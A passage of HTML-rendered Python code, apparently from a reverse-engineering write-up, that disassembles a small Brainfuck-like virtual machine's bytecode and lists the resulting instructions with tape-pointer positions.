class="line">inputindex=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">709</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(index)+<span class="string">&quot;: &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> vmcode[index]==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;inputchar+=1   &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(inputindex)</span><br><span class="line">    <span class="keyword">elif</span> vmcode[index]==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;inputchar-=1   &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(inputindex)</span><br><span class="line">    <span class="keyword">elif</span> vmcode[index]==<span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;input  &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(inputindex)</span><br><span class="line">    <span class="keyword">elif</span> vmcode[index]==<span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;inputchar index +1   &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        inputindex+=<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(inputindex)</span><br><span class="line">    <span class="keyword">elif</span> vmcode[index]==<span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;inputchar index -1   &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        inputindex-=<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(inputindex)</span><br><span class="line">    <span class="keyword">elif</span> vmcode[index]==<span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;if inputchar == 0 jump &quot;</span>+ <span class="built_in">str</span>(jumptable[index]+<span class="number">1</span>)+<span class="string">&#x27;  &#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(inputindex)</span><br><span class="line">    <span class="keyword">elif</span> vmcode[index]==<span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;if inputchar != 0 jump &quot;</span>+ <span class="built_in">str</span>(jumptable[index]+<span class="number">1</span>)+<span class="string">&#x27;  &#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(inputindex)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0: inputchar index +1   1</span></span><br><span class="line"><span class="string">1: inputchar index +1   2</span></span><br><span class="line"><span class="string">2: if inputchar == 0 jump 5  2</span></span><br><span class="line"><span class="string">3: inputchar-=1   2</span></span><br><span class="line"><span class="string">4: if inputchar != 0 jump 3  2</span></span><br><span class="line"><span class="string">5: inputchar index +1   3</span></span><br><span class="line"><span class="string">6: if inputchar == 0 jump 9  3</span></span><br><span class="line"><span class="string">7: inputchar-=1   3</span></span><br><span class="line"><span class="string">8: if inputchar != 0 jump 7  3</span></span><br><span class="line"><span class="string">9: inputchar index -1   2</span></span><br><span class="line"><span class="string">10: inputchar index +1   3</span></span><br><span class="line"><span class="string">11: inputchar+=1   3</span></span><br><span class="line"><span class="string">12: inputchar+=1   3</span></span><br><span class="line"><span class="string">13: inputchar+=1   3</span></span><br><span class="line"><span class="string">14: inputchar+=1   3</span></span><br><span class="line"><span class="string">15: inputchar+=1   3</span></span><br><span class="line"><span class="string">16: inputchar+=1   3</span></span><br><span class="line"><span class="string">17: inputchar+=1   3</span></span><br><span class="line"><span class="string">18: inputchar+=1   3</span></span><br><span class="line"><span class="string">19: if inputchar == 0 jump 33  3</span></span><br><span class="line"><span class="string">20: inputchar index -1   2</span></span><br><span class="line"><span class="string">21: inputchar+=1   2</span></span><br><span class="line"><span class="string">22: inputchar+=1   2</span></span><br><span class="line"><span class="string">23: inputchar+=1   2</span></span><br><span class="line"><span class="string">24: inputchar+=1   2</span></span><br><span class="line"><span class="string">25: inputchar+=1   2</span></span><br><span class="line"><span class="string">26: inputchar+=1   2</span></span><br><span class="line"><span class="string">27: inputchar+=1   2</span></span><br><span class="line"><span class="string">28: inputchar+=1   2</span></span><br><span class="line"><span class="string">29: inputchar+=1   2</span></span><br><span class="line"><span class="string">30: inputchar index +1   3</span></span><br><span class="line"><span class="string">31: inputchar-=1   3</span></span><br><span class="line"><span class="string">32: if inputchar != 0 jump 20  3</span></span><br><span class="line"><span class="string">33: inputchar index -1   2</span></span><br><span class="line"><span class="string">34: inputchar+=1   2</span></span><br><span class="line"><span class="string">35: 36: inputchar index +1   3</span></span><br><span class="line"><span class="string">37: inputchar+=1   3</span></span><br><span class="line"><span class="string">38: inputchar+=1   3</span></span><br><span class="line"><span class="string">39: inputchar+=1   3</span></span><br><span class="line"><span class="string">40: inputchar+=1   3</span></span><br><span class="line"><span class="string">41: inputchar+=1   3</span></span><br><span class="line"><span class="string">42: inputchar+=1   3</span></span><br><span class="line"><span class="string">43: if inputchar == 0 jump 54  3</span></span><br><span class="line"><span class="string">44: inputchar index -1   2</span></span><br><span class="line"><span class="string">45: inputchar+=1   2</span></span><br><span class="line"><span class="string">46: inputchar+=1   2</span></span><br><span class="line"><span class="string">47: inputchar+=1   2</span></span><br><span class="line"><span class="string">48: inputchar+=1   2</span></span><br><span class="line"><span class="string">49: inputchar+=1   2</span></span><br><span class="line"><span class="string">50: inputchar+=1   2</span></span><br><span class="line"><span class="string">51: inputchar index +1   3</span></span><br><span class="line"><span class="string">52: inputchar-=1   3</span></span><br><span class="line"><span class="string">53: if inputchar != 0 jump 44  3</span></span><br><span class="line"><span class="string">54: inputchar index -1   2</span></span><br><span class="line"><span class="string">55: inputchar+=1   2</span></span><br><span class="line"><span class="string">56: 57: inputchar+=1   2</span></span><br><span class="line"><span class="string">58: inputchar+=1   2</span></span><br><span class="line"><span class="string">59: 60: inputchar+=1   2</span></span><br><span class="line"><span class="string">61: inputchar+=1   2</span></span><br><span class="line"><span class="string">62: inputchar+=1   2</span></span><br><span class="line"><span class="string">63: inputchar+=1   2</span></span><br><span class="line"><span class="string">64: inputchar+=1   2</span></span><br><span class="line"><span class="string">65: 66: inputchar-=1   2</span></span><br><span class="line"><span class="string">67: 68: inputchar index +1   3</span></span><br><span class="line"><span class="string">69: inputchar+=1   3</span></span><br><span class="line"><span class="string">70: inputchar+=1   3</span></span><br><span class="line"><span class="string">71: inputchar+=1   3</span></span><br><span class="line"><span class="string">72: inputchar+=1   3</span></span><br><span class="line"><span class="string">73: inputchar+=1   3</span></span><br><span class="line"><span class="string">74: inputchar+=1   3</span></span><br><span class="line"><span class="string">75: inputchar+=1   3</span></span><br><span class="line"><span class="string">76: if inputchar == 0 jump 89  3</span></span><br><span class="line"><span class="string">77: inputchar index -1   2</span></span><br><span class="line"><span class="string">78: inputchar-=1   2</span></span><br><span class="line"><span class="string">79: inputchar-=1   2</span></span><br><span class="line"><span class="string">80: inputchar-=1   2</span></span><br><span class="line"><span class="string">81: inputchar-=1   2</span></span><br><span class="line"><span class="string">82: inputchar-=1   2</span></span><br><span class="line"><span class="string">83: inputchar-=1   2</span></span><br><span class="line"><span class="string">84: inputchar-=1   2</span></span><br><span class="line"><span class="string">85: inputchar-=1   2</span></span><br><span class="line"><span class="string">86: inputchar index +1   3</span></span><br><span class="line"><span class="string">87: inputchar-=1   3</span></span><br><span class="line"><span class="string">88: if inputchar != 0 jump 77  3</span></span><br><span class="line"><span class="string">89: inputchar index -1   2</span></span><br><span class="line"><span class="string">90: inputchar-=1   2</span></span><br><span class="line"><span class="string">91: inputchar-=1   2</span></span><br><span class="line"><span class="string">92: 93: if inputchar == 0 jump 96  2</span></span><br><span class="line"><span class="string">94: inputchar-=1   2</span></span><br><span class="line"><span class="string">95: if inputchar != 0 jump 94  2</span></span><br><span class="line"><span class="string">96: inputchar+=1   2</span></span><br><span class="line"><span class="string">97: inputchar index +1   3</span></span><br><span class="line"><span class="string">98: inputchar index -1   2</span></span><br><span class="line"><span class="string">99: inputchar index +1   3</span></span><br><span class="line"><span class="string">100: if inputchar == 0 jump 103  3</span></span><br><span class="line"><span class="string">101: inputchar-=1   3</span></span><br><span class="line"><span class="string">102: if inputchar != 0 jump 101  3</span></span><br><span class="line"><span class="string">103: inputchar index -1   2</span></span><br><span class="line"><span class="string">104: inputchar index -1   1</span></span><br><span class="line"><span class="string">105: if inputchar == 0 jump 108  1</span></span><br><span class="line"><span class="string">106: inputchar-=1   1</span></span><br><span class="line"><span class="string">107: if inputchar != 0 jump 106  1</span></span><br><span class="line"><span class="string">108: inputchar index +1   2</span></span><br><span class="line"><span class="string">109: if inputchar == 0 jump 118  2</span></span><br><span class="line"><span class="string">110: inputchar index +1   3</span></span><br><span class="line"><span class="string">111: inputchar+=1   3</span></span><br><span class="line"><span class="string">112: inputchar index -1   2</span></span><br><span class="line"><span class="string">113: inputchar index -1   1</span></span><br><span class="line"><span class="string">114: inputchar+=1   1</span></span><br><span class="line"><span class="string">115: inputchar index +1   2</span></span><br><span class="line"><span class="string">116: inputchar-=1   2</span></span><br><span class="line"><span class="string">117: if inputchar != 0 jump 110  2</span></span><br><span class="line"><span class="string">118: inputchar index +1   3</span></span><br><span class="line"><span class="string">119: if inputchar == 0 jump 125  3</span></span><br><span class="line"><span class="string">120: inputchar index -1   2</span></span><br><span class="line"><span class="string">121: inputchar+=1   2</span></span><br><span class="line"><span class="string">122: inputchar index +1   3</span></span><br><span class="line"><span class="string">123: inputchar-=1   3</span></span><br><span class="line"><span class="string">124: if inputchar != 0 jump 120  3</span></span><br><span class="line"><span class="string">125: inputchar index -1   2</span></span><br><span class="line"><span class="string">126: inputchar index +1   3</span></span><br><span class="line"><span class="string">127: inputchar index -1   2</span></span><br><span class="line"><span class="string">128: if inputchar == 0 jump 131  2</span></span><br><span class="line"><span class="string">129: inputchar-=1   2</span></span><br><span class="line"><span class="string">130: if inputchar != 0 jump 129  2</span></span><br><span class="line"><span class="string">131: inputchar index +1   3</span></span><br><span class="line"><span class="string">132: inputchar index -1   2</span></span><br><span class="line"><span class="string">133: input  2</span></span><br><span class="line"><span class="string">134: inputchar index +1   3</span></span><br><span class="line"><span class="string">135: if inputchar == 0 jump 138  3</span></span><br><span class="line"><span class="string">136: inputchar-=1   3</span></span><br><span class="line"><span class="string">137: if inputchar != 0 jump 136  3</span></span><br><span class="line"><span class="string">138: inputchar index +1   4</span></span><br><span class="line"><span class="string">139: if inputchar == 0 jump 142  4</span></span><br><span class="line"><span class="string">140: inputchar-=1   4</span></span><br><span class="line"><span class="string">141: if inputchar != 0 jump 140  4</span></span><br><span class="line"><span class="string">142: inputchar+=1   4</span></span><br><span class="line"><span class="string">143: inputchar+=1   4</span></span><br><span class="line"><span class="string">144: inputchar+=1   4</span></span><br><span class="line"><span class="string">145: inputchar+=1   4</span></span><br><span class="line"><span class="string">146: inputchar+=1   4</span></span><br><span class="line"><span class="string">147: inputchar+=1   4</span></span><br><span class="line"><span class="string">148: inputchar+=1   4</span></span><br><span class="line"><span class="string">149: if inputchar == 0 jump 165  4</span></span><br><span class="line"><span class="string">150: inputchar index -1   3</span></span><br><span class="line"><span class="string">151: inputchar+=1   3</span></span><br><span class="line"><span class="string">152: inputchar+=1   3</span></span><br><span class="line"><span class="string">153: inputchar+=1   3</span></span><br><span class="line"><span class="string">154: inputchar+=1   3</span></span><br><span class="line"><span class="string">155: inputchar+=1   3</span></span><br><span class="line"><span class="string">156: inputchar+=1   3</span></span><br><span class="line"><span class="string">157: inputchar+=1   3</span></span><br><span class="line"><span class="string">158: inputchar+=1   3</span></span><br><span class="line"><span class="string">159: inputchar+=1   3</span></span><br><span class="line"><span class="string">160: inputchar+=1   3</span></span><br><span class="line"><span class="string">161: inputchar+=1   3</span></span><br><span class="line"><span class="string">162: inputchar index +1   4</span></span><br><span class="line"><span class="string">163: inputchar-=1   4</span></span><br><span class="line"><span class="string">164: if inputchar != 0 jump 150  4</span></span><br><span class="line"><span class="string">165: inputchar index -1   3</span></span><br><span class="line"><span class="string">166: inputchar index +1   4</span></span><br><span class="line"><span class="string">167: inputchar index -1   3</span></span><br><span class="line"><span class="string">168: inputchar index -1   2</span></span><br><span class="line"><span class="string">169: inputchar index +1   3</span></span><br><span class="line"><span class="string">170: if inputchar == 0 jump 176  3</span></span><br><span class="line"><span class="string">171: inputchar index -1   2</span></span><br><span class="line"><span class="string">172: inputchar-=1   2</span></span><br><span class="line"><span class="string">173: inputchar index +1   3</span></span><br><span class="line"><span class="string">174: inputchar-=1   3</span></span><br><span class="line"><span class="string">175: if inputchar != 0 jump 171  3</span></span><br><span class="line"><span class="string">176: inputchar index -1   2</span></span><br><span class="line"><span class="string">177: if inputchar == 0 jump 228  2</span></span><br><span class="line"><span class="string">178: inputchar index +1   3</span></span><br><span class="line"><span class="string">179: inputchar index +1   4</span></span><br><span class="line"><span class="string">180: if inputchar == 0 jump 183  4</span></span><br><span class="line"><span class="string">181: inputchar-=1   4</span></span><br><span class="line"><span class="string">182: if inputchar != 0 jump 181  4</span></span><br><span class="line"><span class="string">183: inputchar index +1   5</span></span><br><span class="line"><span class="string">184: inputchar index -1   4</span></span><br><span class="line"><span class="string">185: inputchar index +1   5</span></span><br><span class="line"><span class="string">186: if inputchar == 0 jump 189  5</span></span><br><span class="line"><span class="string">187: inputchar-=1   5</span></span><br><span class="line"><span class="string">188: if inputchar != 0 jump 187  5</span></span><br><span class="line"><span class="string">189: inputchar index -1   4</span></span><br><span class="line"><span class="string">190: inputchar index -1   3</span></span><br><span class="line"><span class="string">191: inputchar index -1   2</span></span><br><span class="line"><span class="string">192: inputchar index -1   1</span></span><br><span class="line"><span class="string">193: if inputchar == 0 jump 196  1</span></span><br><span class="line"><span class="string">194: inputchar-=1   1</span></span><br><span class="line"><span class="string">195: if inputchar != 0 jump 194  1</span></span><br><span class="line"><span class="string">196: inputchar index +1   2</span></span><br><span class="line"><span class="string">197: inputchar index +1   3</span></span><br><span class="line"><span class="string">198: inputchar index +1   4</span></span><br><span class="line"><span class="string">199: if inputchar == 0 jump 212  4</span></span><br><span class="line"><span class="string">200: inputchar index +1   5</span></span><br><span class="line"><span class="string">201: inputchar+=1   5</span></span><br><span class="line"><span class="string">202: inputchar index -1   4</span></span><br><span class="line"><span class="string">203: inputchar index -1   3</span></span><br><span class="line"><span class="string">204: inputchar index -1   2</span></span><br><span class="line"><span class="string">205: inputchar index -1   1</span></span><br><span class="line"><span class="string">206: inputchar+=1   1</span></span><br><span class="line"><span class="string">207: inputchar index +1   2</span></span><br><span class="line"><span class="string">208: inputchar index +1   3</span></span><br><span class="line"><span class="string">209: inputchar index +1   4</span></span><br><span class="line"><span class="string">210: inputchar-=1   4</span></span><br><span class="line"><span class="string">211: if inputchar != 0 jump 200  4</span></span><br><span class="line"><span class="string">212: inputchar index +1   5</span></span><br><span class="line"><span class="string">213: if inputchar == 0 jump 219  5</span></span><br><span class="line"><span class="string">214: inputchar index -1   4</span></span><br><span class="line"><span class="string">215: inputchar+=1   4</span></span><br><span class="line"><span class="string">216: inputchar index +1   5</span></span><br><span class="line"><span class="string">217: inputchar-=1   5</span></span><br><span class="line"><span class="string">218: if inputchar != 0 jump 214  5</span></span><br><span class="line"><span class="string">219: inputchar index -1   4</span></span><br><span class="line"><span class="string">220: inputchar index +1   5</span></span><br><span class="line"><span class="string">221: inputchar index -1   4</span></span><br><span class="line"><span class="string">222: inputchar index -1   3</span></span><br><span class="line"><span class="string">223: inputchar index -1   2</span></span><br><span class="line"><span class="string">224: if inputchar == 0 jump 227  2</span></span><br><span class="line"><span class="string">225: inputchar-=1   2</span></span><br><span class="line"><span class="string">226: if inputchar != 0 jump 225  2</span></span><br><span class="line"><span class="string">227: if inputchar != 0 jump 178  2</span></span><br><span class="line"><span class="string">228: if inputchar == 0 jump 231  2</span></span><br><span class="line"><span class="string">229: inputchar-=1   2</span></span><br><span class="line"><span class="string">230: if inputchar != 0 jump 229  2</span></span><br><span class="line"><span class="string">231: inputchar index +1   3</span></span><br><span class="line"><span class="string">232: inputchar index -1   2</span></span><br><span class="line"><span class="string">233: input  2</span></span><br><span class="line"><span class="string">234: inputchar index +1   3</span></span><br><span class="line"><span class="string">235: if inputchar == 0 jump 238  3</span></span><br><span class="line"><span class="string">236: inputchar-=1   3</span></span><br><span class="line"><span class="string">237: if inputchar != 0 jump 236  3</span></span><br><span class="line"><span class="string">238: inputchar index +1   4</span></span><br><span class="line"><span class="string">239: if inputchar == 0 jump 242  4</span></span><br><span class="line"><span class="string">240: inputchar-=1   4</span></span><br><span class="line"><span class="string">241: if inputchar != 0 jump 240  4</span></span><br><span class="line"><span class="string">242: inputchar+=1   4</span></span><br><span class="line"><span class="string">243: inputchar+=1   4</span></span><br><span class="line"><span class="string">244: inputchar+=1   4</span></span><br><span class="line"><span class="string">245: inputchar+=1   4</span></span><br><span class="line"><span class="string">246: inputchar+=1   4</span></span><br><span class="line"><span class="string">247: inputchar+=1   4</span></span><br><span class="line"><span class="string">248: if inputchar == 0 jump 262  4</span></span><br><span class="line"><span class="string">249: inputchar index -1   3</span></span><br><span class="line"><span class="string">250: inputchar+=1   3</span></span><br><span class="line"><span class="string">251: inputchar+=1   3</span></span><br><span class="line"><span class="string">252: inputchar+=1   3</span></span><br><span class="line"><span class="string">253: inputchar+=1   3</span></span><br><span class="line"><span class="string">254: inputchar+=1   3</span></span><br><span class="line"><span class="string">255: inputchar+=1   3</span></span><br><span class="line"><span class="string">256: inputchar+=1   3</span></span><br><span class="line"><span class="string">257: inputchar+=1   3</span></span><br><span class="line"><span class="string">258: inputchar+=1   3</span></span><br><span class="line"><span class="string">259: inputchar index +1   4</span></span><br><span class="line"><span class="string">260: inputchar-=1   4</span></span><br><span class="line"><span class="string">261: if inputchar != 0 jump 249  4</span></span><br><span class="line"><span class="string">262: inputchar index -1   3</span></span><br><span class="line"><span class="string">263: inputchar-=1   3</span></span><br><span class="line"><span class="string">264: inputchar index +1   4</span></span><br><span class="line"><span class="string">265: inputchar index -1   3</span></span><br><span class="line"><span class="string">266: inputchar index -1   2</span></span><br><span class="line"><span class="string">267: inputchar index +1   3</span></span><br><span class="line"><span class="string">268: if inputchar == 0 jump 274  3</span></span><br><span class="line"><span class="string">269: inputchar index -1   2</span></span><br><span class="line"><span class="string">270: inputchar-=1   2</span></span><br><span class="line"><span class="string">271: inputchar index +1   3</span></span><br><span class="line"><span class="string">272: inputchar-=1   3</span></span><br><span class="line"><span class="string">273: if inputchar != 0 jump 269  3</span></span><br><span class="line"><span class="string">274: inputchar index -1   2</span></span><br><span class="line"><span class="string">275: if inputchar == 0 jump 326  2</span></span><br><span class="line"><span class="string">276: inputchar index +1   3</span></span><br><span class="line"><span class="string">277: inputchar index +1   4</span></span><br><span class="line"><span class="string">278: if inputchar == 0 jump 281  4</span></span><br><span class="line"><span class="string">279: inputchar-=1   4</span></span><br><span class="line"><span class="string">280: if inputchar != 0 jump 279  4</span></span><br><span class="line"><span class="string">281: inputchar index +1   5</span></span><br><span class="line"><span class="string">282: inputchar index -1   4</span></span><br><span class="line"><span class="string">283: inputchar index +1   5</span></span><br><span class="line"><span class="string">284: if inputchar == 0 jump 287  5</span></span><br><span class="line"><span class="string">285: inputchar-=1   5</span></span><br><span class="line"><span class="string">286: if inputchar != 0 jump 285  5</span></span><br><span class="line"><span class="string">287: inputchar index -1   4</span></span><br><span class="line"><span class="string">288: inputchar index -1   3</span></span><br><span class="line"><span class="string">289: inputchar index -1   2</span></span><br><span class="line"><span class="string">290: inputchar index -1   1</span></span><br><span class="line"><span class="string">291: if inputchar == 0 jump 294  1</span></span><br><span class="line"><span class="string">292: inputchar-=1   1</span></span><br><span class="line"><span class="string">293: if inputchar != 0 jump 292  1</span></span><br><span class="line"><span class="string">294: inputchar index +1   2</span></span><br><span class="line"><span class="string">295: inputchar index +1   3</span></span><br><span class="line"><span class="string">296: inputchar index +1   4</span></span><br><span class="line"><span class="string">297: if inputchar == 0 jump 310  4</span></span><br><span class="line"><span class="string">298: inputchar index +1   5</span></span><br><span class="line"><span class="string">299: inputchar+=1   5</span></span><br><span class="line"><span class="string">300: inputchar index -1   4</span></span><br><span class="line"><span class="string">301: inputchar index -1   3</span></span><br><span class="line"><span class="string">302: inputchar index -1   2</span></span><br><span class="line"><span class="string">303: inputchar index -1   1</span></span><br><span class="line"><span class="string">304: inputchar+=1   1</span></span><br><span class="line"><span class="string">305: inputchar index +1   2</span></span><br><span class="line"><span class="string">306: inputchar index +1   3</span></span><br><span class="line"><span class="string">307: inputchar index +1   4</span></span><br><span class="line"><span class="string">308: inputchar-=1   4</span></span><br><span class="line"><span class="string">309: if inputchar != 0 jump 298  4</span></span><br><span class="line"><span class="string">310: inputchar index +1   5</span></span><br><span class="line"><span class="string">311: if inputchar == 0 jump 317  5</span></span><br><span class="line"><span class="string">312: inputchar index -1   4</span></span><br><span class="line"><span class="string">313: inputchar+=1   4</span></span><br><span class="line"><span class="string">314: inputchar index +1   5</span></span><br><span class="line"><span class="string">315: inputchar-=1   5</span></span><br><span class="line"><span class="string">316: if inputchar != 0 jump 312  5</span></span><br><span class="line"><span class="string">317: inputchar index -1   4</span></span><br><span class="line"><span class="string">318: inputchar index +1   5</span></span><br><span class="line"><span class="string">319: inputchar index -1   4</span></span><br><span class="line"><span class="string">320: inputchar index -1   3</span></span><br><span class="line"><span class="string">321: inputchar index -1   2</span></span><br><span class="line"><span class="string">322: if inputchar == 0 jump 325  2</span></span><br><span class="line"><span class="string">323: inputchar-=1   2</span></span><br><span class="line"><span class="string">324: if inputchar != 0 jump 323  2</span></span><br><span class="line"><span class="string">325: if inputchar != 0 jump 276  2</span></span><br><span class="line"><span class="string">326: if inputchar == 0 jump 329  2</span></span><br><span class="line"><span class="string">327: inputchar-=1   2</span></span><br><span class="line"><span class="string">328: if inputchar != 0 jump 327  2</span></span><br><span class="line"><span class="string">329: inputchar index +1   3</span></span><br><span class="line"><span class="string">330: inputchar index -1   2</span></span><br><span class="line"><span class="string">331: input  2</span></span><br><span class="line"><span class="string">332: inputchar index +1   3</span></span><br><span class="line"><span class="string">333: if inputchar == 0 jump 336  3</span></span><br><span class="line"><span class="string">334: inputchar-=1   3</span></span><br><span class="line"><span class="string">335: if inputchar != 0 jump 334  3</span></span><br><span class="line"><span class="string">336: inputchar index +1   4</span></span><br><span class="line"><span class="string">337: if inputchar == 0 jump 340  4</span></span><br><span class="line"><span class="string">338: inputchar-=1   4</span></span><br><span class="line"><span class="string">339: if inputchar != 0 jump 338  4</span></span><br><span class="line"><span class="string">340: inputchar+=1   4</span></span><br><span class="line"><span class="string">341: inputchar+=1   4</span></span><br><span class="line"><span class="string">342: inputchar+=1   4</span></span><br><span class="line"><span class="string">343: inputchar+=1   4</span></span><br><span class="line"><span class="string">344: inputchar+=1   4</span></span><br><span class="line"><span class="string">345: inputchar+=1   4</span></span><br><span class="line"><span class="string">346: inputchar+=1   4</span></span><br><span class="line"><span class="string">347: inputchar+=1   4</span></span><br><span class="line"><span class="string">348: if inputchar == 0 jump 364  4</span></span><br><span class="line"><span class="string">349: inputchar index -1   3</span></span><br><span class="line"><span class="string">350: inputchar+=1   3</span></span><br><span class="line"><span class="string">351: inputchar+=1   3</span></span><br><span class="line"><span class="string">352: inputchar+=1   3</span></span><br><span class="line"><span class="string">353: inputchar+=1   3</span></span><br><span class="line"><span class="string">354: inputchar+=1   3</span></span><br><span class="line"><span class="string">355: inputchar+=1   3</span></span><br><span class="line"><span class="string">356: inputchar+=1   3</span></span><br><span class="line"><span class="string">357: inputchar+=1   3</span></span><br><span class="line"><span class="string">358: inputchar+=1   3</span></span><br><span class="line"><span class="string">359: inputchar+=1   3</span></span><br><span class="line"><span class="string">360: inputchar+=1   3</span></span><br><span class="line"><span class="string">361: inputchar index +1   4</span></span><br><span class="line"><span class="string">362: inputchar-=1   4</span></span><br><span class="line"><span class="string">363: if inputchar != 0 jump 349  4</span></span><br><span class="line"><span class="string">364: inputchar index -1   3</span></span><br><span class="line"><span class="string">365: inputchar+=1   3</span></span><br><span class="line"><span class="string">366: inputchar index +1   4</span></span><br><span class="line"><span class="string">367: inputchar index -1   3</span></span><br><span class="line"><span class="string">368: inputchar index -1   2</span></span><br><span class="line"><span class="string">369: inputchar index +1   3</span></span><br><span class="line"><span class="string">370: if inputchar == 0 jump 376  3</span></span><br><span class="line"><span class="string">371: inputchar index -1   2</span></span><br><span class="line"><span class="string">372: inputchar-=1   2</span></span><br><span class="line"><span class="string">373: inputchar index +1   3</span></span><br><span class="line"><span class="string">374: inputchar-=1   3</span></span><br><span class="line"><span class="string">375: if inputchar != 0 jump 371  3</span></span><br><span class="line"><span class="string">376: inputchar index -1   2</span></span><br><span class="line"><span class="string">377: if inputchar == 0 jump 428  2</span></span><br><span class="line"><span class="string">378: inputchar index +1   3</span></span><br><span class="line"><span class="string">379: inputchar index +1   4</span></span><br><span class="line"><span class="string">380: if inputchar == 0 jump 383  4</span></span><br><span class="line"><span class="string">381: inputchar-=1   4</span></span><br><span class="line"><span class="string">382: if inputchar != 0 jump 381  4</span></span><br><span class="line"><span class="string">383: inputchar index +1   5</span></span><br><span class="line"><span class="string">384: inputchar index -1   4</span></span><br><span class="line"><span class="string">385: inputchar index +1   5</span></span><br><span class="line"><span class="string">386: if inputchar == 0 jump 389  5</span></span><br><span class="line"><span class="string">387: inputchar-=1   5</span></span><br><span class="line"><span class="string">388: if inputchar != 0 jump 387  5</span></span><br><span class="line"><span class="string">389: inputchar index -1   4</span></span><br><span class="line"><span class="string">390: inputchar index -1   3</span></span><br><span class="line"><span class="string">391: inputchar index -1   2</span></span><br><span class="line"><span class="string">392: inputchar index -1   1</span></span><br><span class="line"><span class="string">393: if inputchar == 0 jump 396  1</span></span><br><span class="line"><span class="string">394: inputchar-=1   1</span></span><br><span class="line"><span class="string">395: if inputchar != 0 jump 394  1</span></span><br><span class="line"><span class="string">396: inputchar index +1   2</span></span><br><span class="line"><span class="string">397: inputchar index +1   3</span></span><br><span class="line"><span class="string">398: inputchar index +1   4</span></span><br><span class="line"><span class="string">399: if inputchar == 0 jump 412  4</span></span><br><span class="line"><span class="string">400: inputchar index +1   5</span></span><br><span class="line"><span class="string">401: inputchar+=1   5</span></span><br><span class="line"><span class="string">402: inputchar index -1   4</span></span><br><span class="line"><span class="string">403: inputchar index -1   3</span></span><br><span class="line"><span class="string">404: inputchar index -1   2</span></span><br><span class="line"><span class="string">405: inputchar index -1   1</span></span><br><span class="line"><span class="string">406: inputchar+=1   1</span></span><br><span class="line"><span class="string">407: inputchar index +1   2</span></span><br><span class="line"><span class="string">408: inputchar index +1   3</span></span><br><span class="line"><span class="string">409: inputchar index +1   4</span></span><br><span class="line"><span class="string">410: inputchar-=1   4</span></span><br><span class="line"><span class="string">411: if inputchar != 0 jump 400  4</span></span><br><span class="line"><span class="string">412: inputchar index +1   5</span></span><br><span class="line"><span class="string">413: if inputchar == 0 jump 419  5</span></span><br><span class="line"><span class="string">414: inputchar index -1   4</span></span><br><span class="line"><span class="string">415: inputchar+=1   4</span></span><br><span class="line"><span class="string">416: inputchar index +1   5</span></span><br><span class="line"><span class="string">417: inputchar-=1   5</span></span><br><span class="line"><span class="string">418: if inputchar != 0 jump 414  5</span></span><br><span class="line"><span class="string">419: inputchar index -1   4</span></span><br><span class="line"><span class="string">420: inputchar index +1   5</span></span><br><span class="line"><span class="string">421: inputchar index -1   4</span></span><br><span class="line"><span class="string">422: inputchar index -1   3</span></span><br><span class="line"><span class="string">423: inputchar index -1   2</span></span><br><span class="line"><span class="string">424: if inputchar == 0 jump 427  2</span></span><br><span class="line"><span class="string">425: inputchar-=1   2</span></span><br><span class="line"><span class="string">426: if inputchar != 0 jump 425  2</span></span><br><span class="line"><span class="string">427: if inputchar != 0 jump 378  2</span></span><br><span class="line"><span class="string">428: if inputchar == 0 jump 431  2</span></span><br><span class="line"><span class="string">429: inputchar-=1   2</span></span><br><span class="line"><span class="string">430: if inputchar != 0 jump 429  2</span></span><br><span class="line"><span class="string">431: inputchar index +1   3</span></span><br><span class="line"><span class="string">432: inputchar index -1   2</span></span><br><span class="line"><span class="string">433: input  2</span></span><br><span class="line"><span class="string">434: inputchar index +1   3</span></span><br><span class="line"><span class="string">435: if inputchar == 0 jump 438  3</span></span><br><span class="line"><span class="string">436: inputchar-=1   3</span></span><br><span class="line"><span class="string">437: if inputchar != 0 jump 436  3</span></span><br><span class="line"><span class="string">438: inputchar index +1   4</span></span><br><span class="line"><span class="string">439: if inputchar == 0 jump 442  4</span></span><br><span class="line"><span class="string">440: inputchar-=1   4</span></span><br><span class="line"><span class="string">441: if inputchar != 0 jump 440  4</span></span><br><span class="line"><span class="string">442: inputchar+=1   4</span></span><br><span class="line"><span class="string">443: inputchar+=1   4</span></span><br><span class="line"><span class="string">444: inputchar+=1   4</span></span><br><span class="line"><span class="string">445: inputchar+=1   4</span></span><br><span class="line"><span class="string">446: inputchar+=1   4</span></span><br><span class="line"><span class="string">447: inputchar+=1   4</span></span><br><span class="line"><span class="string">448: inputchar+=1   4</span></span><br><span class="line"><span class="string">449: inputchar+=1   4</span></span><br><span class="line"><span class="string">450: if inputchar == 0 jump 467  4</span></span><br><span class="line"><span class="string">451: inputchar index -1   3</span></span><br><span class="line"><span 